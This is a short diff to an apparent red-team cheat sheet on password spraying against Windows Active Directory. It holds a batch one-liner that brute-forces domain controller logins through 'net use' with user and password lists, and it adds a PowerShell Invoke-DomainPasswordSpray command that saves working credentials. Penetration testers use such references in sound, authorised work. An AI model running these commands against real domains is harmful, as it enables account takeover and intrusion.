@@ -97,6 +97,10 @@ $month$year
 
 `@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL`
 
+### Powershell
+
+`Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt`
+
 ## Non-domain joined testing
 
 When you have an initial set of compromised creds run these from a Virtual Machine to place foothold on network as domain user.
